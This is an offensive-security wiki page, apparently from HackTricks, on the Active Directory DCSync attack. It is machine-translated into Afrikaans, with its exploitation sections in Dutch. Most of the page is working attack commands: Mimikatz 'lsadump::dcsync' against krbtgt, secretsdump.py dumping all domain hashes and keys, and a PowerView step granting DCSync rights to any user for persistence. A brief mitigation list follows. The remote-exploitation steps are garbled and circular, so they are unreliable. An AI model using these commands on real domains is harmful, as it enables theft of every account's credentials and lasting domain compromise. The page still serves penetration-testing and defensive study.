# DCSync

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik en outomatiese werkstrome te bou met behulp van die wêreld se mees gevorderde gemeenskapsinstrumente.\
Kry vandag toegang:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

## DCSync

Die **DCSync**-toestemming impliseer dat hierdie toestemmings oor die domein self beskik word: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** en **Replicating Directory Changes In Filtered Set**.

**Belangrike notas oor DCSync:**

* Die **DCSync-aanval boots die gedrag van 'n domeinbeheerder na en vra ander domeinbeheerders om inligting te repliseer** deur die Directory Replication Service Remote Protocol (MS-DRSR) te gebruik. Omdat MS-DRSR 'n geldige en noodsaaklike funksie van Active Directory is, kan dit nie afgeskakel of gedeaktiveer word nie.
* Standaard het slegs die **Domain Admins, Enterprise Admins, Administrators en Domain Controllers**-groepe die nodige bevoegdhede.
* As enige rekeningwagwoorde met omkeerbare enkripsie gestoor word, is daar 'n opsie in Mimikatz beskikbaar om die wagwoord in duidelike teks terug te gee.

### Opname

Kyk wie hierdie toestemmings het deur `powerview` te gebruik:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### Exploiteer Lokaal

Om de DCSync-aanval lokaal uit te voeren, moet je toegang hebben tot een Windows-machine die lid is van het Active Directory-domein. Volg de onderstaande stappen om de aanval uit te voeren:

1. Verkrijg lokale beheerdersrechten op de Windows-machine.
2. Installeer Mimikatz op de machine. Mimikatz is een krachtige tool die wordt gebruikt om inloggegevens te stelen en te manipuleren.
3. Voer Mimikatz uit met de opdracht `privilege::debug` om debugprivileges te verkrijgen.
4. Gebruik de opdracht `lsadump::dcsync /user:<gebruikersnaam>` om de NTLM-hash van het opgegeven gebruikersaccount op te halen.
5. De verkregen NTLM-hash kan worden gebruikt om de beveiligingsprincipaal van het domein te imiteren en toegang te krijgen tot gevoelige informatie, zoals wachtwoorden van andere gebruikers.

Het is belangrijk op te merken dat deze aanvalsmethode alleen werkt als je lokale beheerdersrechten hebt op de Windows-machine.
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Exploiteer op afstand

Om de DCSync-aanval op afstand uit te voeren, moet je toegang hebben tot een systeem dat is verbonden met het doeldomein. Dit kan een Windows-machine zijn die lid is van het domein of een systeem dat is geconfigureerd als een domeincontroller. Volg de onderstaande stappen om de aanval uit te voeren:

1. Identificeer een systeem dat is verbonden met het doeldomein en waarop je toegangsrechten hebt.
2. Verkrijg de hash van het domeinaccount dat je wilt ophalen met behulp van de DCSync-aanval.
3. Gebruik de verkregen hash om een Golden Ticket aan te maken met behulp van de Mimikatz-tool.
4. Verkrijg de NTLM-hash van het domeinaccount dat je wilt ophalen met behulp van de Mimikatz-tool.
5. Gebruik de verkregen NTLM-hash om de DCSync-aanval uit te voeren met behulp van de Mimikatz-tool.
6. De DCSync-aanval zal de NTLM-hash van het domeinaccount ophalen en deze opslaan in een bestand.

Opmerking: Zorg ervoor dat je de nodige toestemming hebt voordat je deze aanval uitvoert, aangezien het ongeoorloofde toegang tot een domein kan inhouden.
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` genereer 3 lêers:

* een met die **NTLM-hashes**
* een met die **Kerberos-sleutels**
* een met klaarteks wagwoorde van die NTDS vir enige rekeninge wat ingestel is met [**omkeerbare enkripsie**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) geaktiveer. Jy kan gebruikers met omkeerbare enkripsie kry met

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Volharding

As jy 'n domein-admin is, kan jy hierdie regte aan enige gebruiker verleen met behulp van `powerview`:
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Dan kan jy **nagaan of die gebruiker korrek toegewys is** aan die 3 voorregte deur na hulle te soek in die uitset van (jy behoort die name van die voorregte binne die "ObjectType" veld te sien):
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Versagting

* Sekuriteitsgebeurtenis-ID 4662 (Auditeerbeleid vir voorwerp moet geaktiveer word) - 'n Operasie is uitgevoer op 'n voorwerp
* Sekuriteitsgebeurtenis-ID 5136 (Auditeerbeleid vir voorwerp moet geaktiveer word) - 'n Gidsdiensvoorwerp is gewysig
* Sekuriteitsgebeurtenis-ID 4670 (Auditeerbeleid vir voorwerp moet geaktiveer word) - Regte op 'n voorwerp is verander
* AD ACL-skandeerder - Skep en vergelyk skepverslae van ACL's. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## Verwysings

* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
* [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy in HackTricks wil adverteer** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik en **outomatiese werksvloeie** te bou met behulp van die wêreld se **mees gevorderde** gemeenskapsinstrumente.\
Kry vandag toegang:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
